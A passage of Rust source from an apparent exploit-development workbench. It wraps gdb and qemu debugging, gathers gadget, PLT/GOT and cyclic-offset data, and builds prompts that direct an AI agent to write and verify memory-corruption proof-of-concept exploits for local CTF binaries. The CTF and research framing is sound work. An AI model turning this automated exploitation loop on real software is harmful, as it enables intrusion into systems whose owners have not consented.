            arch.as_deref(),
            args,
            stdin_spec,
            effective_sysroot.as_deref(),
            breakpoints,
            continue_after_break,
            timeout_secs,
        );
    }

    let Some(gdb) = find_in_path("gdb") else {
        return Ok(serde_json::json!({
            "kind": "debug_probe",
            "available": false,
            "missing_tool": "gdb",
            "install_hint": "install gdb to enable register/backtrace/crash probes",
        }));
    };

    let stdin_bytes = read_input_spec(stdin_spec)?;
    let stdin_file = if let Some(bytes) = stdin_bytes {
        let mut file = tempfile::NamedTempFile::new()?;
        file.write_all(&bytes)?;
        Some(file)
    } else {
        None
    };

    let mut gdb_args = vec![
        "--quiet".to_string(),
        "--batch".to_string(),
        binary.to_string_lossy().into_owned(),
        "-ex".to_string(),
        "set pagination off".to_string(),
        "-ex".to_string(),
        "set confirm off".to_string(),
        "-ex".to_string(),
        "set disassembly-flavor intel".to_string(),
    ];
    if !args.is_empty() {
        gdb_args.push("-ex".to_string());
        gdb_args.push(format!(
            "set args {}",
            args.iter()
                .map(|s| gdb_quote(s))
                .collect::<Vec<_>>()
                .join(" ")
        ));
    }
    for bp in breakpoints {
        gdb_args.push("-ex".to_string());
        let bp = if bp.starts_with("0x") || bp.chars().all(|c| c.is_ascii_hexdigit()) {
            format!("break *{}", bp)
        } else {
            format!("break {}", bp)
        };
        gdb_args.push(bp);
    }
    gdb_args.push("-ex".to_string());
    let run_cmd = if let Some(file) = &stdin_file {
        format!("run < {}", file.path().display())
    } else {
        "run".to_string()
    };
    gdb_args.push(run_cmd);
    if continue_after_break && !breakpoints.is_empty() {
        gdb_args.push("-ex".to_string());
        gdb_args.push("continue".to_string());
    }
    let reg_command = register_command_for_arch(arch.as_deref());
    for command in [
        reg_command.as_str(),
        "bt",
        "x/16i $pc",
        "info proc mappings",
    ] {
        gdb_args.push("-ex".to_string());
        gdb_args.push(command.to_string());
    }
    let mut cmd = Command::new(&gdb);
    cmd.args(&gdb_args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0);
    }

    let output = run_captured(cmd, None, timeout_secs, 768 * 1024)?;
    let combined = format!(
        "{}{}",
        output.get("stdout").and_then(|v| v.as_str()).unwrap_or(""),
        output.get("stderr").and_then(|v| v.as_str()).unwrap_or("")
    );
    Ok(serde_json::json!({
        "kind": "debug_probe",
        "available": true,
        "gdb": gdb,
        "binary": binary,
        "args": args,
        "breakpoints": breakpoints,
        "result": output,
        "registers": parse_gdb_registers(&combined),
        "signals": extract_gdb_signals(&combined),
        "next_action": if combined.contains("SIGSEGV") || combined.contains("SIGILL") || combined.contains("SIGABRT") {
            "Use registers and $pc disassembly to compute overwrite/control-flow offset, then verify with exploit-verify."
        } else if combined.contains("No such file or directory") || combined.contains("not found") {
            "Fix loader/sysroot/library environment, then rerun debug-probe."
        } else {
            "Correlate register/backtrace output with ir-query/function-context and rerun with a narrower breakpoint."
        },
    }))
}

fn debug_probe_remote_json(
    binary: &Path,
    arch: Option<&str>,
    args: &[String],
    stdin_spec: Option<&str>,
    sysroot: Option<&Path>,
    breakpoints: &[String],
    continue_after_break: bool,
    timeout_secs: u64,
) -> Result<serde_json::Value> {
    let Some(gdb) = find_in_path("gdb-multiarch") else {
        return Ok(serde_json::json!({
            "kind": "debug_probe",
            "available": false,
            "binary": binary,
            "arch": arch,
            "host_arch": host_arch_label(),
            "missing_tool": "gdb-multiarch",
            "runtime_runner": default_runner_for_arch(arch),
            "install_hint": "install gdb-multiarch for cross-architecture debugging",
            "next_action": "Use runtime-run for qemu execution now; install gdb-multiarch to enable cross-arch debug probes.",
        }));
    };
    let Some(qemu) = default_runner_for_arch(arch) else {
        return Ok(serde_json::json!({
            "kind": "debug_probe",
            "available": false,
            "binary": binary,
            "arch": arch,
            "host_arch": host_arch_label(),
            "gdb": gdb,
            "missing_tool": format!("qemu-user for {}", arch.unwrap_or("target")),
            "install_hint": "install qemu-user or qemu-user-static for this target architecture",
        }));
    };

    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
    let runtime = runtime_candidates(binary, &data);
    let has_loader_blocker =
        runtime
            .get("notes")
            .and_then(|v| v.as_array())
            .map_or(false, |notes| {
                notes.iter().any(|note| {
                    note.get("kind")
                        .and_then(|v| v.as_str())
                        .is_some_and(|kind| kind == "missing_interpreter")
                })
            });
    let effective_sysroot = effective_sysroot(
        sysroot,
        arch,
        runtime.get("interpreter").and_then(|v| v.as_str()),
    );
    if has_loader_blocker && effective_sysroot.is_none() {
        return Ok(serde_json::json!({
            "kind": "debug_probe",
            "available": false,
            "binary": binary,
            "arch": arch,
            "host_arch": host_arch_label(),
            "gdb": gdb,
            "qemu": qemu,
            "runtime": runtime,
            "reason": "target dynamic loader/sysroot is missing; qemu gdbstub cannot reach target code",
            "next_action": "Install the matching loader/sysroot or rerun debug-probe with --sysroot <root>.",
        }));
    }

    let listener = std::net::TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    drop(listener);

    let stdin_bytes = read_input_spec(stdin_spec)?;
    let mut qemu_cmd = Command::new(&qemu);
    qemu_cmd.arg("-g").arg(port.to_string());
    if let Some(sysroot) = effective_sysroot.as_deref() {
        qemu_cmd.arg("-L").arg(sysroot);
    }
    qemu_cmd
        .arg(binary)
        .args(args)
        .stdin(if stdin_bytes.is_some() {
            Stdio::piped()
        } else {
            Stdio::null()
        })
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        qemu_cmd.process_group(0);
    }
    let qemu_command = format!("{:?}", qemu_cmd);
    let mut qemu_child = match qemu_cmd.spawn() {
        Ok(child) => child,
        Err(e) => {
            return Ok(serde_json::json!({
                "kind": "debug_probe",
                "available": false,
                "binary": binary,
                "arch": arch,
                "gdb": gdb,
                "qemu": qemu,
                "spawn_error": e.to_string(),
            }));
        }
    };
    if let Some(input) = stdin_bytes {
        if let Some(mut stdin) = qemu_child.stdin.take() {
            let _ = stdin.write_all(&input);
        }
    }
    let qemu_stdout = qemu_child.stdout.take().expect("qemu stdout piped");
    let qemu_stderr = qemu_child.stderr.take().expect("qemu stderr piped");
    let qemu_stdout_thread = std::thread::spawn(move || read_limited(qemu_stdout, 512 * 1024));
    let qemu_stderr_thread = std::thread::spawn(move || read_limited(qemu_stderr, 512 * 1024));

    std::thread::sleep(Duration::from_millis(150));

    let mut gdb_args = vec![
        "--quiet".to_string(),
        "--batch".to_string(),
        binary.to_string_lossy().into_owned(),
        "-ex".to_string(),
        "set pagination off".to_string(),
        "-ex".to_string(),
        "set confirm off".to_string(),
        "-ex".to_string(),
        "set debuginfod enabled off".to_string(),
        "-ex".to_string(),
        "set disassembly-flavor intel".to_string(),
        "-ex".to_string(),
        format!("target remote 127.0.0.1:{port}"),
    ];
    for bp in breakpoints {
        gdb_args.push("-ex".to_string());
        let bp = if bp.starts_with("0x") || bp.chars().all(|c| c.is_ascii_hexdigit()) {
            format!("break *{}", bp)
        } else {
            format!("break {}", bp)
        };
        gdb_args.push(bp);
    }
    gdb_args.push("-ex".to_string());
    gdb_args.push("continue".to_string());
    if continue_after_break && !breakpoints.is_empty() {
        gdb_args.push("-ex".to_string());
        gdb_args.push("continue".to_string());
    }
    let reg_command = register_command_for_arch(arch);
    for command in [reg_command.as_str(), "bt", "x/16i $pc", "info files"] {
        gdb_args.push("-ex".to_string());
        gdb_args.push(command.to_string());
    }

    let mut gdb_cmd = Command::new(&gdb);
    gdb_cmd
        .args(&gdb_args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        gdb_cmd.process_group(0);
    }

    let gdb_output = run_captured(gdb_cmd, None, timeout_secs, 768 * 1024)?;

    let _ = qemu_child.try_wait()?;
    #[cfg(unix)]
    unsafe {
        libc::killpg(qemu_child.id() as i32, libc::SIGKILL);
    }
    #[cfg(not(unix))]
    {
        let _ = qemu_child.kill();
    }
    let qemu_status = qemu_child.wait().ok();
    let qemu_stdout = qemu_stdout_thread.join().unwrap_or_default();
    let qemu_stderr = qemu_stderr_thread.join().unwrap_or_default();
    let qemu_stdout_text = String::from_utf8_lossy(&qemu_stdout).into_owned();
    let qemu_stderr_text = String::from_utf8_lossy(&qemu_stderr).into_owned();

    let combined = format!(
        "{}{}{}{}",
        gdb_output
            .get("stdout")
            .and_then(|v| v.as_str())
            .unwrap_or(""),
        gdb_output
            .get("stderr")
            .and_then(|v| v.as_str())
            .unwrap_or(""),
        qemu_stdout_text,
        qemu_stderr_text
    );
    Ok(serde_json::json!({
        "kind": "debug_probe",
        "available": true,
        "mode": "qemu-gdbstub",
        "binary": binary,
        "arch": arch,
        "host_arch": host_arch_label(),
        "gdb": gdb,
        "qemu": qemu,
        "sysroot_selected": effective_sysroot.as_deref(),
        "qemu_command": qemu_command,
        "remote": format!("127.0.0.1:{port}"),
        "args": args,
        "breakpoints": breakpoints,
        "gdb_result": gdb_output,
        "qemu_result": {
            "exit_code": qemu_status.and_then(|s| s.code()),
            "stdout": qemu_stdout_text,
            "stderr": qemu_stderr_text,
            "stdout_truncated": qemu_stdout.len() >= 512 * 1024,
            "stderr_truncated": qemu_stderr.len() >= 512 * 1024,
        },
        "registers": parse_gdb_registers(&combined),
        "signals": extract_gdb_signals(&combined),
        "next_action": if combined.contains("SIGSEGV") || combined.contains("SIGILL") || combined.contains("SIGABRT") {
            "Use registers and $pc disassembly to compute overwrite/control-flow offset, then verify with exploit-verify."
        } else if combined.contains("No such file or directory") || combined.contains("not found") {
            "Fix loader/sysroot/library environment, then rerun debug-probe."
        } else if combined.contains("Breakpoint") {
            "Breakpoint hit; inspect registers/disassembly and rerun with --continue-after-break or a narrower breakpoint."
        } else {
            "Correlate gdb/qemu output with ir-query and rerun with target input or breakpoints."
        },
    }))
}

fn exploit_kit_json(
    binary: &Path,
    cyclic_len: Option<usize>,
    cyclic_find: Option<&str>,
    cyclic_search_len: usize,
    max_gadgets: usize,
) -> Result<serde_json::Value> {
    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
    let context = build_exploit_context(binary, max_gadgets)?;
    let plt = tools::dispatch(
        "resolve_plt",
        &serde_json::json!({ "path": binary.to_string_lossy() }),
    );
    let cyclic_pattern_text = cyclic_len.map(|len| cyclic_pattern(len.min(1024 * 1024)));
    let cyclic_offset = cyclic_find.map(|needle| {
        let pattern = cyclic_pattern(cyclic_search_len.min(1024 * 1024));
        serde_json::json!({
            "needle": needle,
            "offset": cyclic_find_offset(&pattern, needle),
            "search_len": cyclic_search_len.min(1024 * 1024),
            "endianness": "little-endian integer forms and direct text are both tried",
        })
    });

    let arch = if let Ok(goblin::Object::Elf(elf)) = goblin::Object::parse(&data) {
        elf_arch_label(&elf)
    } else {
        "unknown".to_string()
    };
    Ok(serde_json::json!({
        "kind": "exploit_kit",
        "binary": binary,
        "checksec": context.get("protections"),
        "runtime": context.get("runtime"),
        "gadget_hints": context.get("gadget_hints"),
        "plt_got": {
            "ok": !plt.output.starts_with("Error:"),
            "text": plt.output,
        },
        "cyclic": {
            "alphabet": "abcdefghijklmnopqrstuvwxyz",
            "pattern": cyclic_pattern_text,
            "find": cyclic_offset,
        },
        "recipes": exploit_recipes(&arch, context.get("protections")),
        "inferred_exploit_strategy": context.get("inferred_exploit_strategy"),
    }))
}

fn ir_query_json(
    binary: &Path,
    function: Option<&str>,
    search: Option<&str>,
    max: usize,
) -> Result<serde_json::Value> {
    let max = max.clamp(1, 500);
    let functions = match core::recovery::recover(binary, max) {
        Ok(index) => serde_json::json!({
            "source": "professional_recovery",
            "total": index.functions.len(),
            "functions": index.functions.iter().map(|function| serde_json::json!({
                "address": function.start,
                "vaddr": function.start,
                "size": function.size,
                "name": function.name,
                "confidence": function.confidence,
                "blocks": function.blocks.len(),
                "edges": function.edges.len(),
                "source": function.source,
            })).collect::<Vec<_>>(),
        }),
        Err(err) => {
            let funcs_raw = tools::dispatch(
                "list_functions",
                &serde_json::json!({
                    "path": binary.to_string_lossy(),
                    "max_results": max,
                    "json": true,
                }),
            );
            serde_json::from_str::<serde_json::Value>(&funcs_raw.output)
                .unwrap_or_else(|_| serde_json::json!({ "raw": funcs_raw.output, "recovery_error": err.to_string() }))
        }
    };
    let strings_raw = tools::dispatch(
        "strings_extract",
        &serde_json::json!({
            "path": binary.to_string_lossy(),
            "min_len": 4,
            "max_results": max,
        }),
    );

    let mut selected = serde_json::Value::Null;
    if let Some(addr) = function {
        let vaddr = parse_int(addr)?;
        let disasm = tools::dispatch(
            "disassemble",
            &serde_json::json!({
                "path": binary.to_string_lossy(),
                "vaddr": vaddr,
                "length": 320,
            }),
        );
        let decomp = core::decompile::decompile_enhanced_path(binary, vaddr)
            .unwrap_or_else(|err| format!("Error: {err}"));
        let xrefs = tools::dispatch(
            "xrefs_to",
            &serde_json::json!({ "path": binary.to_string_lossy(), "vaddr": vaddr }),
        );
        selected = serde_json::json!({
            "vaddr": format!("0x{vaddr:x}"),
            "disassembly": tool_text_json(disasm.output),
            "decompile": tool_text_json(decomp),
            "xrefs_to": tool_text_json(xrefs.output),
        });
    }

    let search_hits = search.map(|needle| {
        let needle_l = needle.to_ascii_lowercase();
        let mut hits = Vec::new();
        collect_json_text_hits("functions", &functions, &needle_l, &mut hits, 40);
        for line in strings_raw.output.lines() {
            if line.to_ascii_lowercase().contains(&needle_l) {
                hits.push(serde_json::json!({ "source": "strings", "text": line }));
                if hits.len() >= 80 {
                    break;
                }
            }
        }
        hits
    });

    Ok(serde_json::json!({
        "kind": "ir_query",
        "binary": binary,
        "functions": functions,
        "selected_function": selected,
        "strings": tool_text_json(strings_raw.output),
        "search": {
            "needle": search,
            "hits": search_hits,
        },
        "next_actions": [
            "Use --function 0xADDR on promising functions to retrieve decompile/disassembly/xrefs together.",
            "Use runtime-run/debug-probe to validate whether candidate input reaches the selected function.",
            "Promote useful names/comments through existing MCP/UI annotation tools."
        ],
    }))
}

fn analysis_loop_json(
    binary: &Path,
    goal: &str,
    observation: Option<&str>,
    candidate: Option<&Path>,
    max_gadgets: usize,
) -> Result<serde_json::Value> {
    let cli = kaijulab_cli_q();
    let context = build_exploit_context(binary, max_gadgets)?;
    let kit = exploit_kit_json(binary, Some(256), None, 8192, max_gadgets)?;
    let ir = ir_query_json(binary, None, None, 40)?;
    let runtime_notes = context
        .pointer("/runtime/notes")
        .cloned()
        .unwrap_or_default();
    let candidate_status = if let Some(path) = candidate {
        serde_json::json!({
            "path": path,
            "exists": path.exists(),
            "verify_command": format!(
                "{cli} api exploit-verify --file {} --expect-target-exit 42 {}",
                shell_quote(&binary.to_string_lossy()),
                shell_quote(&path.to_string_lossy())
            ),
        })
    } else {
        serde_json::Value::Null
    };
    Ok(serde_json::json!({
        "kind": "analysis_loop",
        "binary": binary,
        "goal": goal,
        "observation": observation,
        "state": {
            "context": context,
            "exploit_kit": kit,
            "ir_overview": ir,
            "candidate": candidate_status,
        },
        "loop_contract": [
            "Hypothesize from context/IR.",
            "Run runtime-run or debug-probe to collect concrete behavior.",
            "Start a live debug-session when one-shot probes do not expose enough state.",
            "Use crash-offset when stdin reaches a memory-corruption path.",
            "Save useful observations as evidence and cite evidence IDs in the final result.",
            "Edit candidate PoC.",
            "Run exploit-verify with an explicit predicate.",
            "Stop only on success=true or a structured environment blocker."
        ],
        "tool_contract": {
            "one_shot_behavior": [
                format!("{cli} api runtime-run --file {}", shell_quote(&binary.to_string_lossy())),
                format!("{cli} api debug-probe --file {}", shell_quote(&binary.to_string_lossy())),
                format!("{cli} api crash-offset --file {}", shell_quote(&binary.to_string_lossy()))
            ],
            "live_debug": [
                format!("{cli} api debug-session-start"),
                format!("{cli} api debug-session-action <id> break --address 0xADDR"),
                format!("{cli} api debug-session-action <id> continue"),
                format!("{cli} api debug-session-action <id> snapshot"),
                format!("{cli} api debug-session-stop <id>")
            ],
            "evidence": [
                format!("{cli} api evidence-list --file {}", shell_quote(&binary.to_string_lossy())),
                "Prefer --save-evidence on runtime-run/debug-probe/exploit-verify/crash-offset when the observation changes the exploit hypothesis."
            ]
        },
        "recommended_next_tool": recommended_next_tool(observation, &runtime_notes, candidate),
        "agent_prompt_fragment": format!(
            "Use {cli} api analysis-loop --file {} --candidate <poc> after each failed attempt; use runtime-run/debug-probe/debug-session/crash-offset for behavior and exploit-verify for proof.",
            shell_quote(&binary.to_string_lossy())
        ),
    }))
}

fn exploit_batch_exec_prompt(
    binary: &Path,
    output: &Path,
    attempts: u32,
    sysroot: Option<&Path>,
    context: &serde_json::Value,
) -> Result<String> {
    let cli = kaijulab_cli_q();
    let strategy = context
        .get("inferred_exploit_strategy")
        .cloned()
        .unwrap_or_default();
    let compact = serde_json::json!({
        "arch": context.get("arch"),
        "protections": context.get("protections"),
        "imports_sample": context.get("imports_sample"),
        "runtime": context.get("runtime"),
        "adjacent_shared_objects": context.get("adjacent_shared_objects"),
        "gadget_hints": context.get("gadget_hints"),
        "ranked_families": strategy.get("ranked_families"),
        "libc_symbol_offsets": strategy.get("libc_symbol_offsets"),
    });
    let sysroot_arg = sysroot
        .map(|path| format!(" --sysroot {}", shell_quote(&path.to_string_lossy())))
        .unwrap_or_default();
    Ok(format!(
        r#"Solve this local CTF pwn target with KaijuLab commands and write one Python stdlib PoC.

Target: {binary}
Output script: {output}
Attempt budget: {attempts}
Sysroot arg: {sysroot_arg}

Compact facts:
{compact}

Required loop:
1. Use this absolute KaijuLab command even if you cd elsewhere: `{cli}`.
2. Use at most 3 quick KaijuLab probes before writing {output_q}. Do not run raw objdump/readelf/strings before a candidate exists.
3. Prefer these exact commands:
   - `{cli} api binary-facts --file {binary_q}`
   - `{cli} api heap-probe-plan --file {binary_q}`
   - `{cli} api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"1"}},{{"read_for_ms":200}}]' --expect TEXT --timeout-secs 5`
   - `{cli} api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'`
   - `{cli} api leak-probe --file {binary_q}{sysroot_arg} --cycle '[{{"recv_until":"choice"}},{{"send_line":"2"}},{{"read_for_ms":200}}]' --want pointer --max-rounds 4`
   - `{cli} api libc-resolve --file {binary_q} --leak 0xADDR --symbol puts`
   - `{cli} api exploit-plan --file {binary_q} --primitive duplicate-allocation --primitive arbitrary-write`
   - `{cli} api poc-synthesize --file {binary_q}{sysroot_arg} --chain arbitrary-write --primitive duplicate-allocation --primitive arbitrary-write --output {output_q}`
   - `{cli} api constraint-plan --file {binary_q} --mode sorted-ascending --value 0xADDR`
4. `poc-synthesize` output is only plumbing. Before verification, edit {output_q} so it has concrete menu actions and no unresolved TODO placeholders on the executed path.
5. After writing the real PoC, run `{cli} api exploit-verify --file {binary_q}{sysroot_arg} --expect-target-exit 42 {output_q}`.
6. If verification fails, run `{cli} api poc-repair --file {binary_q}{sysroot_arg} {output_q}` and apply exactly one repair.
7. Print SCRIPT_READY only if exploit-verify returns success=true. Otherwise leave the best candidate at {output_q} and summarize the last structured failure.

PoC requirements:
- Read KAIJU_BINARY/KAIJULAB_BINARY and KAIJU_SYSROOT/KAIJULAB_SYSROOT.
- Use qemu runner with -L sysroot for i386/x86_64 foreign runs.
- Use timeouts/select; do not block forever on reads.
- Prove execution by making the target process exit 42 or by printing an exact marker verified by exploit-verify.
- Do not verify a scaffold whose executed path only contains comments/TODOs; first drive at least one valid target menu path.
"#,
        binary = binary.display(),
        output = output.display(),
        attempts = attempts.max(1),
        sysroot_arg = sysroot_arg,
        compact = serde_json::to_string_pretty(&compact)?,
        binary_q = shell_quote(&binary.to_string_lossy()),
        output_q = shell_quote(&output.to_string_lossy()),
        cli = cli,
    ))
}

fn exploit_loop_prompt(
    binary: &Path,
    output: &Path,
    goal: &str,
    attempts: u32,
    sysroot: Option<&Path>,
    context: &serde_json::Value,
) -> Result<String> {
    let cli = kaijulab_cli_q();
    let context = serde_json::to_string_pretty(context)?;
    let sysroot_arg = sysroot
        .map(|path| format!(" --sysroot {}", shell_quote(&path.to_string_lossy())))
        .unwrap_or_default();
    let sysroot_note = sysroot
        .map(|path| {
            format!(
                "Provided qemu sysroot: {}. Use it for every runtime/debug/verification command and make PoCs read KAIJU_SYSROOT when spawning qemu.",
                path.display()
            )
        })
        .unwrap_or_else(|| {
            "No qemu sysroot was provided. If dynamic loading fails, report the exact loader/sysroot blocker.".to_string()
        });
    Ok(format!(
        r#"Use KaijuLab as an exploit workbench for this local CTF target.

Target: {binary}
Goal: {goal}
Output script: {output}
Attempt budget: {attempts}
{sysroot_note}

Workbench context:
{context}

Rules:
- Write a Python stdlib-only PoC unless the context proves a dependency is required.
- Follow this loop shape strictly:
  1. Spend at most 3 tool calls on triage (`binary-facts`, `exploit-scaffold`, `heap-probe-plan`, `heap-model`, `exploit-drive`, `leak-probe`, `libc-resolve`, `exploit-plan`, `exploit-interact`, `exploit-kit`, `runtime-run`, `ir-query`, or `decompile-enhanced`).
  2. Write a runnable candidate to {output_q} before doing deep manual disassembly.
  3. Run `exploit-verify` immediately after writing the candidate.
  4. For each remaining attempt, change exactly one exploit hypothesis, rerun `exploit-verify`, then either stop on success or leave the best failing candidate in place.
- Do not continue free-form analysis once a candidate exists unless the last `exploit-verify` result identifies a specific missing fact needed for the next edit.
- Use qemu/runtime candidates from the context; handle missing dynamic loaders explicitly.
- Check `adjacent_shared_objects` before claiming a challenge libc is unavailable; use bundled libc paths for offsets/leaks when present.
- Use `inferred_exploit_strategy.ranked_families` to choose the first probes. Treat it as a hypothesis from imports/strings/protections, not as ground truth.
- Use this absolute KaijuLab command even after changing directories: `{cli}`.
- Use `{cli} api binary-facts --file {binary_q}` first when you need a compact, agent-sized summary of protections, imports, strings, libc offsets, gadgets, and ranked exploit families.
- Use `{cli} api exploit-scaffold --file {binary_q} --output {output_q}{sysroot_arg}` before writing a PoC from scratch; then edit the generated candidate instead of rebuilding process/qemu plumbing.
- For heap/menu targets, use `{cli} api heap-probe-plan --file {binary_q}` before guessing primitives, then run synchronized probes with `{cli} api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"4"}},{{"read_for_ms":200}}]' --expect TEXT --timeout-secs 5`.
- After a heap transcript exists, normalize it into events and run `{cli} api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'` before choosing UAF/double-free/overlap hypotheses.
- For leaks, prefer `{cli} api leak-probe --file {binary_q}{sysroot_arg} --setup @setup.json --cycle @cycle.json --want libc --max-rounds 8` over manual transcript scraping; use it for `/proc/self/maps`, repeated show/read cycles, and raw pointer candidate harvesting.
- After any libc leak, run `{cli} api libc-resolve --file {binary_q} --leak 0xADDR --symbol SYMBOL` before hardcoding offsets. After proving primitives, run `{cli} api exploit-plan --file {binary_q} --primitive libc-leak --primitive arbitrary-write` to rank finalization paths.
- Use `{cli} api exploit-context --file {binary_q}` whenever you need refreshed target/runtime/gadget facts.
- Use `{cli} api exploit-recipe --file {binary_q}` to retrieve only the inferred strategy profile.
- Use `{cli} api analysis-loop --file {binary_q} --candidate {output_q}` after failed attempts to refresh loop state.
- Use `{cli} api runtime-run --file {binary_q}{sysroot_arg}` for stdout/stderr/exit behavior and `{cli} api debug-probe --file {binary_q}{sysroot_arg}` for registers/backtrace/crash state.
- Prefer KaijuLab analysis output over raw binutils. Do not use raw `objdump`, `readelf`, `strings`, `ROPgadget`, or `checksec` as the first source of facts when `exploit-kit`, `ir-query`, `decompile-enhanced`, or `exploit-context` already provide the needed data.
- Prefer KaijuLab runtime/debug/verify commands over raw target execution. If you must run the target or helper scripts directly, every command must include a hard timeout and an output cap (`timeout 10s ... | head -c 20000` or equivalent) so menu loops cannot flood the console.
- Do not redirect raw target output to unbounded files. Use `runtime-run --timeout-secs N` or cap file output with `head -c`/`dd count=` before inspection.
- When one-shot probes are insufficient, use live sessions: `{cli} api debug-session-start`, then `debug-session-action <id> break --address 0xADDR`, `continue`, `stepi`, `registers`, `memory`, `snapshot`, and finally `debug-session-stop <id>`.
- If stdin can crash/control execution, run `{cli} api crash-offset --file {binary_q}{sysroot_arg}` before hand-computing offsets.
- Use exact tool syntax: `{cli} api binary-facts --file {binary_q}`; `{cli} api exploit-scaffold --file {binary_q} --output {output_q}{sysroot_arg}`; `{cli} api heap-probe-plan --file {binary_q}`; `{cli} api heap-model --file {binary_q} --events '[{{"op":"alloc","id":0,"size":32}},{{"op":"free","id":0}},{{"op":"show","id":0}}]'`; `{cli} api exploit-drive --file {binary_q}{sysroot_arg} --actions '[{{"recv_until":"choice"}},{{"send_line":"1"}}]' --expect TEXT`; `{cli} api leak-probe --file {binary_q}{sysroot_arg} --cycle '[{{"recv_until":"choice"}},{{"send_line":"2"}},{{"read_for_ms":200}}]' --want pointer`; `{cli} api libc-resolve --file {binary_q} --leak 0xADDR --symbol puts`; `{cli} api exploit-plan --file {binary_q} --primitive libc-leak --primitive arbitrary-write`; `{cli} api poc-repair --file {binary_q}{sysroot_arg} {output_q}`; `{cli} api exploit-kit --file {binary_q}`; `{cli} api ir-query --file {binary_q}`; `{cli} api ir-query --file {binary_q} --function 0xADDR`; `{cli} api ir-query --file {binary_q} --search TEXT`; `{cli} api decompile-enhanced --file {binary_q} 0xADDR`.
- Save important observations with `--save-evidence`, inspect them with `{cli} api evidence-list --file {binary_q}`, and cite evidence IDs in your final status.
- After every candidate edit, run `{cli} api exploit-verify --save-evidence --file {binary_q}{sysroot_arg} {output_q}` with the right predicate (`--expect-target-exit 42`, `--expect-exit 42`, or `--expect-output MARKER`).
- If exploit-verify returns success=true, print SCRIPT_READY and stop.
- Do not print SCRIPT_READY_BLOCKED for exploit complexity, missing offsets, failed hypotheses, or attempt budget. Use it only for true missing environment dependencies such as absent binary/qemu/sysroot/loader, and expect exploit-verify to mark it success=false.
- Do not spin after the attempt budget; leave the best candidate PoC in place, report the last structured failure, and do not claim SCRIPT_READY.
"#,
        binary = binary.display(),
        goal = goal,
        output = output.display(),
        attempts = attempts.max(1),
        sysroot_note = sysroot_note,
        context = context,
        binary_q = shell_quote(&binary.to_string_lossy()),
        output_q = shell_quote(&output.to_string_lossy()),
        sysroot_arg = sysroot_arg,
        cli = cli,
    ))
}

fn agent_decompile_loop_prompt(
    binary: &Path,
    function: u64,
    goal: &str,
    attempts: u32,
    max_functions: usize,
) -> Result<String> {
    let cli = kaijulab_cli_q();
    let enhanced = core::decompile::decompile_enhanced_path(binary, function)?;
    let analysis = core::decompile::decompile_analysis_path(binary, function)?;
    let quality = core::decompile::decompiler_quality_report_path(binary, max_functions)?;
    let analysis = serde_json::to_value(analysis)?;
    let quality = serde_json::to_value(quality)?;
    let compact = serde_json::json!({
        "function": analysis.get("function"),
        "cfg": analysis.get("cfg"),
        "machine": analysis.get("machine"),
        "dataflow": analysis.get("dataflow"),
        "kir": {
            "op_count": analysis.pointer("/kir/op_count"),
            "ssa": analysis.pointer("/kir/ssa"),
            "memory_ssa": analysis.pointer("/kir/memory_ssa"),
            "expression_facts": analysis.pointer("/kir/expression_facts"),
            "type_facts": analysis.pointer("/kir/type_facts"),
            "call_facts": analysis.pointer("/kir/call_facts"),
        },
        "quality": {
            "binary": quality.get("binary"),
            "summary": quality.get("summary"),
            "blockers": quality.get("blockers"),
        }
    });
    let compact = serde_json::to_string_pretty(&compact)?;
    let enhanced = truncate_chars(&enhanced, 24_000);
    Ok(format!(
        r#"Use KaijuLab as a decompiler-focused reverse-engineering workbench.

Target: {binary}
Selected function: 0x{function:x}
Goal: {goal}
Attempt budget: {attempts}

Structured decompiler context:
{compact}

Enhanced decompile text:
{enhanced}

Rules:
- Maintain an inspect -> hypothesize -> verify loop. Spend at most {attempts} attempts.
- Use this absolute KaijuLab command even after changing directories: `{cli}`.
- Prefer KaijuLab facts over ad-hoc guessing. Refresh with `{cli} api decompile-analysis --file {binary_q} 0x{function:x}` and `{cli} api decompile-enhanced --file {binary_q} 0x{function:x}` when needed.
- Use `{cli} api recovery-cfg --file {binary_q} 0x{function:x}` and `{cli} api recovery-xrefs --file {binary_q} 0xADDR` for graph-backed control flow and xrefs.
- Use `{cli} api ir-query --file {binary_q} --function 0x{function:x}` for mixed disassembly, strings, xrefs, and pseudo-C.
- Use `{cli} api runtime-run --file {binary_q}` or `{cli} api debug-probe --file {binary_q}` before claiming behavior that depends on runtime state.
- When one-shot probes are insufficient, use live sessions: `{cli} api debug-session-start`, `debug-session-action <id> break --address 0xADDR`, `continue`, `stepi`, `registers`, `memory`, `snapshot`, and `debug-session-stop <id>`.
- Save important runtime/debug observations with `--save-evidence`, then cite evidence IDs from `{cli} api evidence-list --file {binary_q}`.
- If the decompiler output looks wrong, state the likely missing recovery/type/alias fact and the exact KaijuLab improvement that would fix it.
- Finish with DECOMPILER_LOOP_DONE and a concise JSON object: summary, function_semantics, risks, evidence_commands, decompiler_gaps, recommended_next_actions.
"#,
        binary = binary.display(),
        function = function,
        goal = goal,
        attempts = attempts.max(1),
        compact = compact,
        enhanced = enhanced,
        binary_q = shell_quote(&binary.to_string_lossy()),
        cli = cli,
    ))
}

fn truncate_chars(s: &str, max_chars: usize) -> String {
    if s.chars().count() <= max_chars {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max_chars).collect();
    out.push_str("\n...[truncated]...");
    out
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

fn kaijulab_cli_q() -> String {
    if let Ok(path) = std::env::var("KAIJULAB_AGENT_CLI") {
        if !path.trim().is_empty() {
            return shell_quote(path.trim());
        }
    }
